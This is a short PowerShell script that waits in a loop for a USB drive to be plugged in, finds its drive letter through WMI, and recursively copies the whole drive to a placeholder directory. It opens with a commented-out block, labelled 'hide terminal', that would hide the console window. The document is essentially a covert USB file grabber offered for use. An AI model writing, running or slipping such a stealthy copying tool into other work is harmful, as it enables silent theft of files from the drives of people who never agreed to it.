<#$t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
add-type -name win -member $t -namespace native
[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)#> <#hide terminal#>
while($true)
{
$diskdrive = gwmi win32_diskdrive | ?{$_.interfacetype -eq "USB"}
$letters = $diskdrive | %{gwmi -Query "ASSOCIATORS OF {Win32_DiskDrive.DeviceID=`"$($_.DeviceID.replace('\','\\'))`"} WHERE AssocClass = Win32_DiskDriveToDiskPartition"} |  %{gwmi -Query "ASSOCIATORS OF {Win32_DiskPartition.DeviceID=`"$($_.DeviceID)`"} WHERE AssocClass = Win32_LogicalDiskToPartition"} | %{$_. deviceid} 
$drive = gwmi win32_volume | ? {$letters -contains ($_.name -replace "\\")}
$drive.DriveLetter
Write-Output $drive.DriveLetter

if ($drive.DriveLetter)
{
	break
}


}

Copy-Item -Path $drive.DriveLetter -Destination <#your_directory#> -Recurse